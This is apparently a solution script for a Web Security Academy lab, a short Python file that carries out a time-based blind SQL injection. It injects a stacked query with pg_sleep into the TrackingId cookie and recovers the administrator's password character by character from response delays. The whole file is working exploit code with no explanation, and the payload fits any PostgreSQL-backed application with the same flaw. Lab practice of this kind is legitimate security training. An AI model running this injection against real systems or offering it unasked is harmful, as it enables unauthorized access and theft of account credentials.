import requests
letters=['a','b','c','d','e','f','g','h','i','j','k','l','m','n','o','p','q','r','s','t','u','v','w','x','y','z','0','1','2','3','4','5','6','7','8','9','A','B','C','D','E','F','G','H','I','J','K','L','M','N','O','P','Q','R','S','T','U','V','W','X','Y','Z']
url='https://0a68008d048cd681c019155f00f6003b.web-security-academy.net/filter?category=Pets'
# r=requests.get(url)
# print(r.cookies['TrackingId'])
# first_cookie=r.cookies['TrackingId']
Cookie='JswZHsyH4KHjj79s'
password=''
pwd_length=21
for i in range(1,21):
    for j in letters:
        final_cookie=Cookie+"'%3B(select case when SUBSTRING(password,{},1)='{}' then pg_sleep(7) else '' end from users where username='administrator' LIMIT 1)-- - ".format(i,j)
        full_cookie={"TrackingId":final_cookie}
        print("Trying {} position with {}".format(i,j))
        temp=requests.get(url,cookies=full_cookie)
        if temp.elapsed.total_seconds()>6.9:
            password+=j
            print(password)
            break
        print(password)
print(password)